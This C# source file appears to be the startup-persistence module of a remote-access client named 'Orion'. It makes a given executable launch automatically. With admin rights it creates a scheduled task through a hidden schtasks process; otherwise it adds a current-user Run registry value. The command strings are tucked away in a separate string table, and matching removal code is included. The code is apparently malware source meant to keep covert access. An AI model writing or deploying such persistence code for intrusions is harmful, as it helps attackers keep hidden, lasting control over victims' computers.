using Microsoft.Win32;
using Orion.Client.Helper;
using Orion.Common.Enums;
using System.Diagnostics;
using System.Windows.Forms;

namespace Orion.Client.Setup
{
    public class ClientStartup : ClientSetupBase
    {
        public void AddToStartup(string executablePath, string startupName)
        {
            if (SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
            {
               
                
                if (UserAccount.Type == AccountType.Admin)
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo(StrTable.SchTasks)
                    {
                        Arguments = StrTable.StCreate + startupName + StrTable.StCreateMid + executablePath +
                                    StrTable.StCreateTail,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return;
               
                
                }

                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    StrTable.RegRunCU, startupName, executablePath,
                    true);

            }
            else
            {
                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    StrTable.RegRunCU, startupName, executablePath,
                    true);
            }


        }

        public void RemoveFromStartup(string startupName)
        {


            if (SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
            {
                if (UserAccount.Type == AccountType.Admin)
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo(StrTable.SchTasks)
                    {
                        Arguments = StrTable.StDelete + startupName + StrTable.StDeleteTail,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if (p.ExitCode == 0) return;
                }

                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    StrTable.RegRunCU, startupName);
            }
            else
            {
                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    StrTable.RegRunCU, startupName);
            }
              
        }
    }
}
